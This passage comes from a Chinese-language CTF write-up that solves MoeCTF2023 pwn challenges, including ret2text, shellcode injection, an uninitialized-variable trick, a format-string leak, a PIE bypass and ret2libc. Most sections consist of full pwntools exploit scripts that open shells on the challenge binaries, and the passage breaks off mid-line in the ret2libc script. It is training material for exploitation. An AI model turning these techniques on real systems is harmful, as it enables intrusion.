to my stack in MoeCTF2023!</span></span><br><span class="line">line = p.recvline() ;<span class="built_in">print</span>(line) <span class="comment"># What&#x27;s your age?</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x8049070</span> <span class="comment"># plt func system</span></span><br><span class="line">command_addr = <span class="number">0x804c02c</span> <span class="comment"># /bin/sh addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># offset = char buf[84] + var_4 4 byte = s ; s + 4 = r</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">84</span> + <span class="number">4</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += <span class="string">b&#x27;C&#x27;</span> * <span class="number">4</span></span><br><span class="line">payload += p32(command_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">line = p.recvline() ;<span class="built_in">print</span>(line) <span class="comment"># What&#x27;s your age?</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;eV9akrlQlwtJVvpBAk45YMO18UHvBv4n&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ret2text-64"><a href="#ret2text-64" class="headerlink" title="ret2text_64"></a>ret2text_64</h2><p>咱是笨蛋，因为64位栈对齐想了好久 <a target="_blank" rel="noopener" href="https://blog.csdn.net/hu_c_t_f/article/details/131902515">https://blog.csdn.net/hu_c_t_f/article/details/131902515</a></p>
<p>64位使用rdi传第一个参数 传参的顺序分别是rdi rsi rdx rcx r8 r9，所以需要找一个pop rdi ret的gadget</p>
<p>使用ROPgadget –binary pwn | grep pop | grep rdi 就能筛选</p>
<p>offset + ret + gadget + &#x2F;bin&#x2F;sh + func system()</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">port = <span class="number">50215</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">line =  p.recvline() ;<span class="built_in">print</span>(line)</span><br><span class="line">line =  p.recvline() ;<span class="built_in">print</span>(line)</span><br><span class="line">line =  p.recvline() ;<span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">string_addr = <span class="number">0x404050</span> <span class="comment"># bin/sh address</span></span><br><span class="line">gadget_addr = <span class="number">0x4011be</span>   <span class="comment"># pop rdi ret</span></span><br><span class="line">system_addr = <span class="number">0x401090</span> <span class="comment"># system(char * command) address</span></span><br><span class="line">ret_addr = <span class="number">0x040101a</span> <span class="comment"># ret addr</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">80</span> + <span class="number">8</span>) <span class="comment"># offset buf[80] + 8 = r</span></span><br><span class="line">payload += p64(ret_addr) <span class="comment">#64位 gadget中有个ret 消耗了8字节，这里需要再ret一次保持栈对齐</span></span><br><span class="line">payload += p64(gadget_addr)</span><br><span class="line">payload += p64(string_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line"></span><br><span class="line">line =  p.recvline() ;<span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;KsAymn0LqrzuRUcO3QI71N_u3UzZz1m7&#125;</span><br></pre></td></tr></table></figure>



<h2 id="shellcode-level0"><a href="#shellcode-level0" class="headerlink" title="shellcode_level0"></a>shellcode_level0</h2><p>这里的意思是，我传进去的数据会先放到rbp+var_70的位置，然后下面会call我传进去的数据，查询了一下然后根据题目的提示，我只需要用pwntools中的shellcraft来生成shellcode然后sendline过去就好了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+var_70]</span><br><span class="line">mov     rdi, rax</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _gets</span><br><span class="line">lea     rax, [rbp+var_70]</span><br><span class="line">mov     [rbp+var_78], rax</span><br><span class="line">mov     rdx, [rbp+var_78]</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    rdx</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.1.111&quot;</span></span><br><span class="line">port = <span class="number">58988</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./shellcode_level0&quot;)</span></span><br><span class="line"></span><br><span class="line">shellcode  =  asm(shellcraft.sh())</span><br><span class="line">payload = shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里要先设置一下context函数，设置好平台再生成shellcode sendline过去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;ddP0bHRsw_l0B6HQnDFtG62TOXAVXFv6&#125;</span><br></pre></td></tr></table></figure>



<h2 id="shellcode-level1"><a href="#shellcode-level1" class="headerlink" title="shellcode_level1"></a>shellcode_level1</h2><p>mmap和mprotect函数是干嘛用的？我的shellcode怎么没有执行权限？</p>
<p>mmap是类似于malloc但是可以指定内存的读写执行权限是怎么样的，然后mprotect是在已经分配好的内存上面修改内存的权限</p>
<p>在case4里面7的意思是PROT_READ | PROT_WRITE | PROT_EXEC 的结果，可读可写可执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br><span class="line">mprotect(paper4, 0x1000uLL, 7);</span><br></pre></td></tr></table></figure>

<p>然后只需要case4 shellcode就没问题了，pwntools脚本是这样写的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> posixpath</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.129.194&quot;</span></span><br><span class="line">port = <span class="number">57941</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line"><span class="comment"># p = process(&quot;./shellcode_level1&quot;)</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line) <span class="comment"># Which paper will you choose?</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>) <span class="comment"># mprotect(paper4, 0x1000uLL, 7);</span></span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line) <span class="comment"># what do you want to write?</span></span><br><span class="line"></span><br><span class="line">shellcode  =  asm(shellcraft.sh()) ; payload = shellcode</span><br><span class="line">p.sendline(payload) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="uninitialized-key"><a href="#uninitialized-key" class="headerlink" title="uninitialized_key"></a>uninitialized_key</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">get_name</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> age; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  age = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your age:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;age);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your age is %d.\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)age);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">get_key</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> key; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your key:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%5d&quot;</span>, &amp;key);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">114514</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This is my flag.&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>key和age在栈中的地址一样的，所以只需要在get_name中设置age变量为114514，然后scanf这里输入一个非数字的符号，就不会初始化，比如说&#x3D;号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;V5glae83rq6G1nSbZa6pGtWaflnHjE1U&#125;</span><br></pre></td></tr></table></figure>



<h2 id="format-level0"><a href="#format-level0" class="headerlink" title="format_level0"></a>format_level0</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-B0h]</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">80</span>]; <span class="comment">// [esp+4h] [ebp-ACh] BYREF</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">80</span>]; <span class="comment">// [esp+54h] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+A4h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+A8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">  <span class="built_in">memset</span>(name, <span class="number">0</span>, <span class="keyword">sizeof</span>(name));</span><br><span class="line">  fd = open(<span class="string">&quot;flag&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;open flag error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fd, flag, <span class="number">0x50</span>u);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name is: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>搜索后发现 printf(name)这里存在格式化字符串漏洞，可以用%x来泄露栈上的数据，没有加参数列表似乎是从栈起始地址开始读，%x是以16进制输出数据，32位是4字节。</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x</span><br></pre></td></tr></table></figure>

<p>linux上是小端序存储，所以需要反转一下变成大端序显示</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;ff886d4c.50.56648362.ff886e74.0.3.63656f6d.617b6674.4c4c5059.67426344.6e577272.70453348.484b5041.784f3151.64774731.7d515737.a.0.0.0.0.0.0.0.0.0.252e7825&quot;</span></span><br><span class="line">flag = flag.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">segment</span>):</span><br><span class="line">    <span class="keyword">return</span> segment[<span class="number">6</span>:<span class="number">8</span>] + segment[<span class="number">4</span>:<span class="number">6</span>] + segment[<span class="number">2</span>:<span class="number">4</span>] + segment[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">decoded_str_big_endian = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">bytes</span>.fromhex(convert(flag)).decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">for</span> flag <span class="keyword">in</span> flag <span class="keyword">if</span> <span class="built_in">len</span>(flag) == <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decoded_str_big_endian)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;aYPLLDcBgrrWnH3EpAPKHQ1Ox1Gwd7WQ&#125;</span><br></pre></td></tr></table></figure>



<h2 id="PIE-enabled"><a href="#PIE-enabled" class="headerlink" title="PIE_enabled"></a>PIE_enabled</h2><p>查询了一下PIE是一种程序每次运行时候都能加载到不同内存地址的技术，每次加载整个程序中的代码数据和堆栈都会随机化</p>
<p>然后这里把vuln函数的地址打印了出来，查询资料后发现，pie是基地址会变，但是偏移地址是不变的，可以用这里打印的vuln的地址计算出基地址然后用偏移地址来确定数据和函数的位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time i will give u a gift!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Vuln&#x27;s address is:%p\n&quot;</span>, vuln);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体怎么操作我是看这篇文章学会的<br><a target="_blank" rel="noopener" href="https://ir0nstone.gitbook.io/notes/types/stack/pie/pie-exploit">https://ir0nstone.gitbook.io/notes/types/stack/pie/pie-exploit</a> </p>
<p>首先需要将context.binary 设置成 ELF(.&#x2F;pwn)</p>
<p>elf.address &#x3D; vuln - elf.sym[‘vuln’] 这里根据elf的符号表的偏移 算出基地址</p>
<p>下面payload中gadget只需要加上elf.address 这个基地址就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">ip = <span class="string">&quot;192.168.1.129&quot;</span></span><br><span class="line">port = <span class="number">57376</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line"></span><br><span class="line">line = p.recvuntil(<span class="string">b&quot;This time i will give u a gift!\n&quot;</span>); <span class="built_in">print</span>(line) <span class="comment"># This time i will give u a gift!\n</span></span><br><span class="line">line = p.recvuntil(<span class="string">b&quot;Vuln&#x27;s address is:&quot;</span>); <span class="built_in">print</span>(line) <span class="comment"># Vuln&#x27;s address is:%p\n</span></span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line">line = line.replace(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;&quot;</span>); <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">vuln = <span class="built_in">int</span>(line, <span class="number">16</span>)</span><br><span class="line">elf.address = vuln - elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">80</span> + <span class="number">8</span>) <span class="comment"># offset = buf[80] + 8(byte) = r</span></span><br><span class="line"></span><br><span class="line">payload += p64(elf.address + <span class="number">0x00101a</span>) <span class="comment"># ret_address</span></span><br><span class="line">payload += p64(elf.address + <span class="number">0x001323</span>) <span class="comment"># gadget_address pop rdi ; ret</span></span><br><span class="line">payload += p64(elf.address + <span class="number">0x004010</span>) <span class="comment"># /bin/sh address</span></span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;3N3evVehPhOpH9nNLAd6KmD_Z8jhY36t&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hide the b4ckdoor..\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But..maybe libc can help u??\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据题目意思还有程序逻辑，system函数被移除了，所以要到libc里面找</p>
<p>linux每次加载程序的时候libc的基地址都会改变，但是libc内的偏移是不变的，想要调用system这个函数，首先要泄露libc的基地址，然后根据偏移地址去拿到system，这时候可以构造一个这样的调用链puts_plt(puts_got) 把got表中的puts的位置打印出来， 然后用 puts_got 减去libc中基地址与puts的偏移关系，就能拿到libc的基地址，这时候我们需要再回到vuln function里面，再read一遍，用之前的libc_base + system偏移 以及 libc_base + bin&#x2F;sh的偏移 把shell拿到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.1.111&quot;</span></span><br><span class="line">port = <span class="number">63227</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line = p.recvuntil(<span class="string">b&quot;I hide the b4ckdoor..\n&quot;</span>); <span class="built_in">print</span>(line)</span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line">line = p.recvuntil(<span class="string">b&quot;But..maybe libc can help u??\n&quot;</span>); <span class="built_in">print</span>(line)</span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># got 表中的 puts地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># plt</span></span><br><span class="line">gadget_address = <span class="number">0x40117e</span>  <span class="comment"># pop rdi; ret</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">80</span> + <span class="number">8</span>)  <span class="comment"># offset r</span></span><br><span class="line">payload += p64(gadget_address)  <span class="comment"># pop rdi; ret</span></span><br><span class="line">payload += p64(puts_got)  <span class="comment"># puts_plt(put_gots)</span></span><br><span class="line">payload += p64(puts_plt)  <span class="comment"># puts(put_gots) 打印put_got的地址</span></span><br><span class="line">payload += p64(<span class="number">0x4011E8</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收泄露的地址</span></span><br><span class="line">leaked_puts = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Leaked puts address: <span class="subst">&#123;<span class="built_in">hex</span>(leaked_puts)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算libc的基址</span></span><br><span class="line">put_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_base = leaked_puts - put_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Libc base address: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###################################################################################</span></span><br><span class="line"><span class="comment"># 重新回到vuln 然后再read一遍，有了libc的基址 就能根据偏移拿到system /bin/sh</span></span><br><span class="line">line = p.recvuntil(<span class="string">b&quot;I hide the b4ckdoor..\n&quot;</span>); <span class="built_in">print</span>(line)</span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line">line = p.recvuntil(<span class="string">b&quot;But..maybe libc can help u??\n&quot;</span>); <span class="built_in">print</span>(line)</span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#system实际地址</span></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment"># /bin/sh 实际地址</span></span><br><span class="line">ret_address = <span class="number">0x40101a</span> <span class="comment"># ret</span></span><br><span class="line">gadget_address = <span class="number">0x40117e</span> <span class="comment"># pop rdi ret</span></span><br><span class="line"></span><br><span class="line">payload = <span 